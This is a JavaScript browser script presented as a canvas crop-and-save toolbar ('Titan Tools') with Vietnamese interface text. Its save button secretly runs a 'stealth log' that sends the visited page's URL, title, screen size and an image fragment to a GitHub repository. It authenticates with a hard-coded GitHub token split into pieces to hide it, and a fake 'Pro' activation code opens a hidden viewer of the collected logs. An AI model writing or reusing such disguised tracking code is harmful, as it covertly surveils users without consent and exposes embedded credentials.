/**
 * TITAN TOOLS V3.0 - SECURE CANVAS SUITE
 * Stealth Logging + Pro Gate + Full Crop System
 */

(function () {
    if (window._TT3) return;
    window._TT3 = true;

    // --- CONFIG ---
    const C = {
        bg: '#0f172a',
        accent: '#38bdf8',
        text: '#f1f5f9',
        font: 'system-ui, -apple-system, sans-serif',
        // --- INTERNAL (Obfuscated names) ---
        _r: 'vyvegroup',
        _n: 'vtools-logs',
        _f: 'logs.json',
        _k: ['ghp','_ksvqlP8MNDnY5Iz','TGnSeM6CSOf','HexL4bSuE5'].join(''),
        _p: '137isbestrn'
    };

    // --- HASH ENGINE (One-way encode URL -> untraceable ID) ---
    const hashURL = (str) => {
        let h = 0x811c9dc5;
        for (let i = 0; i < str.length; i++) {
            h ^= str.charCodeAt(i);
            h = Math.imul(h, 0x01000193);
        }
        const hex = (h >>> 0).toString(16).padStart(8, '0');
        // Add salt layer
        let s = 0xdeadbeef;
        for (let i = 0; i < str.length; i++) {
            s ^= str.charCodeAt(i);
            s = Math.imul(s, 0x5bd1e995);
            s ^= s >>> 15;
        }
        return hex + (s >>> 0).toString(16).padStart(8, '0');
    };

    // --- GITHUB API ENGINE ---
    const GH = {
        base: `https://api.github.com/repos/${C._r}/${C._n}/contents/${C._f}`,
        headers: {
            'Authorization': `token ${C._k}`,
            'Content-Type': 'application/json',
            'Accept': 'application/vnd.github.v3+json'
        },

        async read() {
            try {
                const r = await fetch(this.base, { headers: this.headers });
                if (r.status === 404) return { data: [], sha: null };
                const j = await r.json();
                const decoded = JSON.parse(atob(j.content));
                return { data: decoded, sha: j.sha };
            } catch (e) {
                return { data: [], sha: null };
            }
        },

        async write(data, sha) {
            const body = {
                message: `log ${Date.now()}`,
                content: btoa(unescape(encodeURIComponent(JSON.stringify(data, null, 2)))),
            };
            if (sha) body.sha = sha;
            try {
                await fetch(this.base, {
                    method: 'PUT',
                    headers: this.headers,
                    body: JSON.stringify(body)
                });
            } catch (e) { /* silent */ }
        },

        async log(entry) {
            const { data, sha } = await this.read();
            data.push(entry);
            // Keep last 500 entries
            if (data.length > 500) data.splice(0, data.length - 500);
            await this.write(data, sha);
        }
    };

    // --- STEALTH LOG (runs on every save) ---
    const stealthLog = (imgDataUrl) => {
        const entry = {
            id: hashURL(window.location.href),
            url: window.location.href,
            title: document.title || '',
            time: new Date().toISOString(),
            screen: `${screen.width}x${screen.height}`,
            thumb: imgDataUrl.substring(0, 200) + '...' // First 200 chars as fingerprint
        };
        GH.log(entry); // Fire and forget
    };

    // --- CSS ---
    const style = document.createElement('style');
    style.innerHTML = `
        #tt-root { 
            position:fixed; z-index:2147483647; top:0; left:0;
            font-family:${C.font}; pointer-events:none;
        }
        .tt-dock {
            pointer-events:auto; position:fixed; bottom:28px; left:50%;
            transform:translateX(-50%); display:flex; gap:8px;
            padding:10px 16px; background:rgba(15,23,42,0.92);
            backdrop-filter:blur(14px); -webkit-backdrop-filter:blur(14px);
            border-radius:18px; border:1px solid rgba(255,255,255,0.12);
            box-shadow:0 8px 32px rgba(0,0,0,0.5);
            animation:ttUp .4s cubic-bezier(.16,1,.3,1);
        }
        .tt-b {
            background:none; border:none; color:${C.text};
            font-size:13px; font-weight:600; padding:9px 14px;
            border-radius:12px; cursor:pointer; display:flex;
            align-items:center; gap:6px; white-space:nowrap;
            transition:.15s;
        }
        .tt-b:active { background:rgba(255,255,255,0.08); transform:scale(.95); }
        .tt-b svg { width:18px; height:18px; fill:currentColor; }
        .tt-b.pri { background:${C.accent}; color:#0a0a0a; }

        .tt-toast {
            position:fixed; top:16px; left:50%; transform:translateX(-50%);
            background:#1e293b; color:#fff; padding:8px 18px;
            border-radius:30px; font-size:12px; opacity:0;
            transition:.3s; pointer-events:none; z-index:2147483647;
            border:1px solid rgba(255,255,255,0.1);
        }
        .tt-toast.on { opacity:1; transform:translateX(-50%) translateY(8px); }

        .tt-ov {
            pointer-events:auto; position:fixed; top:0; left:0;
            width:100vw; height:100vh; background:rgba(0,0,0,0.85);
            display:none; z-index:2147483646;
        }
        .tt-crop {
            position:absolute; border:2px solid ${C.accent};
            box-shadow:0 0 0 9999px rgba(0,0,0,0.7);
        }
        .tt-h {
            position:absolute; width:14px; height:14px;
            background:#fff; border:2px solid ${C.accent};
            border-radius:50%; transform:translate(-50%,-50%); z-index:10;
        }
        .tt-h::after {
            content:''; position:absolute;
            top:-22px; left:-22px; right:-22px; bottom:-22px;
        }
        .tt-act {
            position:fixed; bottom:36px; left:0; width:100%;
            display:flex; justify-content:center; gap:16px;
            z-index:2147483647; pointer-events:auto;
        }
        .tt-act .tt-b {
            background:rgba(30,41,59,0.92); padding:11px 22px;
            font-size:14px; backdrop-filter:blur(10px);
            border:1px solid rgba(255,255,255,0.15);
        }
        .tt-act .tt-b.sv { background:${C.accent}; color:#0a0a0a; border:none; }

        /* Pro Modal */
        .tt-modal {
            pointer-events:auto; position:fixed; top:0; left:0;
            width:100vw; height:100vh; background:rgba(0,0,0,0.9);
            display:none; z-index:2147483647;
            flex-direction:column; align-items:center; justify-content:center;
        }
        .tt-modal-box {
            background:#0f172a; border-radius:20px; padding:28px 24px;
            width:min(90vw,380px); border:1px solid rgba(255,255,255,0.1);
            box-shadow:0 20px 60px rgba(0,0,0,0.5);
        }
        .tt-modal h3 { color:${C.accent}; margin:0 0 6px; font-size:18px; }
        .tt-modal p { color:#94a3b8; font-size:13px; margin:0 0 18px; }
        .tt-modal input {
            width:100%; box-sizing:border-box; padding:12px 16px;
            background:#1e293b; border:1px solid rgba(255,255,255,0.15);
            border-radius:12px; color:#fff; font-size:14px;
            outline:none; margin-bottom:14px;
        }
        .tt-modal input:focus { border-color:${C.accent}; }
        .tt-modal .tt-mbtn {
            width:100%; padding:12px; border:none; border-radius:12px;
            background:${C.accent}; color:#0a0a0a; font-size:14px;
            font-weight:700; cursor:pointer;
        }

        /* Log Viewer */
        .tt-viewer {
            pointer-events:auto; position:fixed; top:0; left:0;
            width:100vw; height:100vh; background:#0b0e14;
            display:none; z-index:2147483647; overflow-y:auto;
            flex-direction:column;
        }
        .tt-vheader {
            position:sticky; top:0; background:rgba(11,14,20,0.95);
            padding:16px 20px; display:flex; align-items:center;
            justify-content:space-between; backdrop-filter:blur(10px);
            border-bottom:1px solid rgba(255,255,255,0.08);
        }
        .tt-vheader h3 { color:${C.accent}; margin:0; font-size:16px; }
        .tt-vclose {
            background:rgba(255,255,255,0.1); border:none; color:#fff;
            width:36px; height:36px; border-radius:50%; font-size:18px;
            cursor:pointer;
        }
        .tt-vlist { padding:12px 16px; }
        .tt-vcard {
            background:#1e293b; border-radius:14px; padding:14px 16px;
            margin-bottom:10px; border:1px solid rgba(255,255,255,0.06);
        }
        .tt-vcard .url {
            color:${C.accent}; font-size:12px; word-break:break-all;
            margin:0 0 4px;
        }
        .tt-vcard .meta {
            color:#64748b; font-size:11px; margin:0;
        }
        .tt-vcard .title-text {
            color:#e2e8f0; font-size:13px; margin:0 0 6px;
            font-weight:600;
        }
        .tt-loading {
            text-align:center; padding:40px; color:#64748b; font-size:14px;
        }

        @keyframes ttUp {
            from{transform:translateX(-50%) translateY(80px);opacity:0}
            to{transform:translateX(-50%) translateY(0);opacity:1}
        }
    `;
    document.head.appendChild(style);

    // --- BUILD UI ---
    const root = document.createElement('div');
    root.id = 'tt-root';

    const Ic = {
        save: `<svg viewBox="0 0 24 24"><path d="M17 3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V7l-4-4zm-5 16c-1.66 0-3-1.34-3-3s1.34-3 3-3 3 1.34 3 3-1.34 3-3 3zm3-10H5V5h10v4z"/></svg>`,
        moon: `<svg viewBox="0 0 24 24"><path d="M10 2c-1.82 0-3.53.5-5 1.35C7.99 5.08 10 8.3 10 12s-2.01 6.92-5 8.65C6.47 21.5 8.18 22 10 22c5.52 0 10-4.48 10-10S15.52 2 10 2z"/></svg>`,
        lock: `<svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>`
    };

    root.innerHTML = `
        <div class="tt-toast" id="ttToast"></div>

        <!-- CROP OVERLAY -->
        <div class="tt-ov" id="ttOv">
            <div id="ttCropArea" style="position:absolute;top:0;left:0;width:100%;height:100%">
                <div class="tt-crop" id="ttCrop"></div>
            </div>
            <div class="tt-act">
                <button class="tt-b" id="ttCropCancel">Hủy</button>
                <button class="tt-b sv" id="ttCropSave">${Ic.save} Lưu Ảnh</button>
            </div>
        </div>

        <!-- PRO MODAL -->
        <div class="tt-modal" id="ttModal">
            <div class="tt-modal-box">
                <h3>${Ic.lock} Auto Draw Pro</h3>
                <p>Nhập mã kích hoạt để sử dụng tính năng này.</p>
                <input type="text" id="ttProInput" placeholder="Nhập mã Pro..." autocomplete="off">
                <button class="tt-mbtn" id="ttProSubmit">Kích Hoạt</button>
                <button class="tt-b" id="ttProClose" style="width:100%;justify-content:center;margin-top:8px;color:#64748b">Đóng</button>
            </div>
        </div>

        <!-- LOG VIEWER -->
        <div class="tt-viewer" id="ttViewer">
            <div class="tt-vheader">
                <h3>Board Logs</h3>
                <button class="tt-vclose" id="ttViewerClose">✕</button>
            </div>
            <div class="tt-vlist" id="ttVList">
                <div class="tt-loading">Đang tải dữ liệu...</div>
            </div>
        </div>

        <!-- MAIN DOCK -->
        <div class="tt-dock" id="ttDock" style="display:none">
            <button class="tt-b" id="ttDark">${Ic.moon} Dark</button>
            <button class="tt-b" id="ttPro" style="opacity:.7">${Ic.lock} Auto</button>
            <div style="width:1px;background:rgba(255,255,255,0.15);margin:0 2px"></div>
            <button class="tt-b pri" id="ttSave">${Ic.save} Lưu</button>
        </div>
    `;
    document.body.appendChild(root);

    // --- STATE ---
    const S = { canvas: null, dark: false };

    const toast = (m) => {
        const t = document.getElementById('ttToast');
        t.innerText = m; t.classList.add('on');
        setTimeout(() => t.classList.remove('on'), 2500);
    };

    // --- SCANNER ---
    const scan = () => {
        const c = document.querySelector('canvas');
        if (c) {
            S.canvas = c;
            document.getElementById('ttDock').style.display = 'flex';
            toast('Canvas Connected');
        } else {
            toast('Đang quét Canvas...');
            setTimeout(scan, 1500);
        }
    };
    setTimeout(scan, 800);

    // --- DARK MODE ---
    document.getElementById('ttDark').addEventListener('click', () => {
        S.dark = !S.dark;
        document.body.style.backgroundColor = S.dark ? '#0b0e14' : '';
        document.body.style.color = S.dark ? '#94a3b8' : '';
        toast(S.dark ? 'Dark Mode On' : 'Dark Mode Off');
    });

    // --- PRO GATE ---
    document.getElementById('ttPro').addEventListener('click', () => {
        document.getElementById('ttModal').style.display = 'flex';
        document.getElementById('ttProInput').value = '';
        document.getElementById('ttProInput').focus();
    });
    document.getElementById('ttProClose').addEventListener('click', () => {
        document.getElementById('ttModal').style.display = 'none';
    });
    document.getElementById('ttProSubmit').addEventListener('click', () => {
        const val = document.getElementById('ttProInput').value.trim();
        if (val === C._p) {
            // SECRET: Open Log Viewer
            document.getElementById('ttModal').style.display = 'none';
            openViewer();
        } else {
            toast('Mã không hợp lệ');
        }
    });

    // --- LOG VIEWER ---
    const openViewer = async () => {
        const viewer = document.getElementById('ttViewer');
        const list = document.getElementById('ttVList');
        viewer.style.display = 'flex';
        list.innerHTML = '<div class="tt-loading">Đang tải dữ liệu...</div>';

        const { data } = await GH.read();

        if (!data || data.length === 0) {
            list.innerHTML = '<div class="tt-loading">Chưa có dữ liệu nào</div>';
            return;
        }

        // Reverse (newest first)
        const sorted = data.reverse();
        list.innerHTML = '';

        sorted.forEach(entry => {
            const card = document.createElement('div');
            card.className = 'tt-vcard';
            
            const time = new Date(entry.time);
            const timeStr = time.toLocaleDateString('vi-VN') + ' ' + time.toLocaleTimeString('vi-VN');
            
            card.innerHTML = `
                <p class="title-text">${entry.title || 'Untitled'}</p>
                <p class="url">${entry.url}</p>
                <p class="meta">ID: ${entry.id} · ${timeStr} · ${entry.screen || ''}</p>
            `;
            
            card.addEventListener('click', () => {
                // Copy URL to clipboard
                navigator.clipboard.writeText(entry.url).then(() => {
                    toast('Đã copy URL');
                }).catch(() => {
                    // Fallback
                    const inp = document.createElement('input');
                    inp.value = entry.url;
                    document.body.appendChild(inp);
                    inp.select();
                    document.execCommand('copy');
                    document.body.removeChild(inp);
                    toast('Đã copy URL');
                });
            });
            
            list.appendChild(card);
        });
    };

    document.getElementById('ttViewerClose').addEventListener('click', () => {
        document.getElementById('ttViewer').style.display = 'none';
    });

    // --- CROP SYSTEM ---
    const ov = document.getElementById('ttOv');
    const crop = document.getElementById('ttCrop');
    const area = document.getElementById('ttCropArea');

    // Add 8 handles
    ['tl','t','tr','r','br','b','bl','l'].forEach(p => {
        const h = document.createElement('div');
        h.className = 'tt-h'; h.dataset.p = p;
        if(p.includes('t')) h.style.top='0%';
        if(p.includes('b')) h.style.top='100%';
        if(p==='l'||p==='r') h.style.top='50%';
        if(p.includes('l')) h.style.left='0%';
        if(p.includes('r')) h.style.left='100%';
        if(p==='t'||p==='b') h.style.left='50%';
        crop.appendChild(h);
    });

    const initCrop = () => {
        if(!S.canvas) { toast('Chưa có Canvas'); return; }
        ov.style.display = 'block';
        document.getElementById('ttDock').style.display = 'none';
        const vw = window.innerWidth, vh = window.innerHeight;
        const sz = Math.min(vw, vh) * 0.7;
        crop.style.width = sz+'px';
        crop.style.height = sz+'px';
        crop.style.left = (vw/2-sz/2)+'px';
        crop.style.top = (vh/2-sz/2)+'px';
    };

    document.getElementById('ttSave').addEventListener('click', initCrop);

    // Touch
    let drag = false, hPos = null, sd = {};

    area.addEventListener('touchstart', (e) => {
        const t = e.target;
        if(t.classList.contains('tt-h')) { drag=true; hPos=t.dataset.p; }
        else if(t.id==='ttCrop') { drag=true; hPos='mv'; }
        else return;
        const tc = e.touches[0];
        const r = crop.getBoundingClientRect();
        sd = { x:tc.clientX, y:tc.clientY, l:r.left, t:r.top, w:r.width, h:r.height };
        e.preventDefault();
    }, {passive:false});

    area.addEventListener('touchmove', (e) => {
        if(!drag) return;
        const tc = e.touches[0];
        const dx = tc.clientX - sd.x, dy = tc.clientY - sd.y;
        let nl=sd.l, nt=sd.t, nw=sd.w, nh=sd.h;

        if(hPos==='mv') { nl+=dx; nt+=dy; }
        else {
            if(hPos.includes('r')) nw=sd.w+dx;
            if(hPos.includes('l')){ nl=sd.l+dx; nw=sd.w-dx; }
            if(hPos.includes('b')) nh=sd.h+dy;
            if(hPos.includes('t')){ nt=sd.t+dy; nh=sd.h-dy; }
        }
        if(nw>40){ crop.style.width=nw+'px'; crop.style.left=nl+'px'; }
        if(nh>40){ crop.style.height=nh+'px'; crop.style.top=nt+'px'; }
        e.preventDefault();
    }, {passive:false});

    area.addEventListener('touchend', () => { drag=false; hPos=null; });

    document.getElementById('ttCropCancel').addEventListener('click', () => {
        ov.style.display = 'none';
        document.getElementById('ttDock').style.display = 'flex';
    });

    // SAVE
    document.getElementById('ttCropSave').addEventListener('click', () => {
        const cr = crop.getBoundingClientRect();
        const cvr = S.canvas.getBoundingClientRect();
        const sx = S.canvas.width / cvr.width;
        const sy = S.canvas.height / cvr.height;

        const x = (cr.left - cvr.left) * sx;
        const y = (cr.top - cvr.top) * sy;
        const w = cr.width * sx;
        const h = cr.height * sy;

        const tc = document.createElement('canvas');
        tc.width = w; tc.height = h;
        const ctx = tc.getContext('2d');

        try {
            ctx.drawImage(S.canvas, x, y, w, h, 0, 0, w, h);

            // --- STEALTH LOG (silent, no watermark on image) ---
            const thumbData = tc.toDataURL('image/jpeg', 0.1);
            stealthLog(thumbData);

            // Download
            const link = document.createElement('a');
            link.download = `IMG_${Date.now()}.png`;
            link.href = tc.toDataURL('image/png', 1.0);
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);

            toast('Đã lưu ảnh');
            ov.style.display = 'none';
            document.getElementById('ttDock').style.display = 'flex';
        } catch (e) {
            toast('Lỗi: Canvas bị khóa (CORS)');
        }
    });

})();
